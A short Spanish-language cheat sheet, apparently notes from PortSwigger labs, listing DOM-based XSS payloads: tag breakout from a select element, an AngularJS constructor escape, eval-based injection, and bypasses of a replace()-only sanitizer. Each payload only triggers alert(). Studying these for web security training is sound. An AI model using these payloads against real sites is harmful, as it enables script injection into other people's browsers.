# XSS DOM 

Tags: #XSS #DOM #PortSwigger #JavaScript #AngularJS 

## XSS DOM con 'document.write' dentro de 'select'

```javascript 
// Se debe de cerrar las etiquetas anteriores para inyectar codigo javascript 
	</option> </select> <h1>Hola</h1>
	</option> </select> <marquee>Hola</marquee>
	
	</option> </select> <script>alert(0)</script>
```

## XSS DOM en AngularJS con comillas codificadas 

* [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

```javascript 
// Es un Angular, por lo que se debe de hacer de la siguiente manera 
	{{constructor.constructor('alert(1)')()}} 
```

## XSS DOM reflejado 

```javascript 
// Si se usa la función 'eval()', se dede de usar funciones aritméticas (+-*), ya que si solo se coloca la siguientes instrucción, no pasará nada ya que eval no lo puede evaluar 
	test\" alert(0) } // 
	test\" + alert(0) } //
```

## XSS DOM almacenado 

```javascript 
// Se usa la función 'replace()' para hacer una pequeña sanitización, pero solo lo hará al primer match, por lo que se puede evadir. Para que realmente funcione la sanitización se debe de usar 'replaceAll()'.
	<><script>alert(0)</script>
	<><img src=0 onerror=alert(0)>
``` 
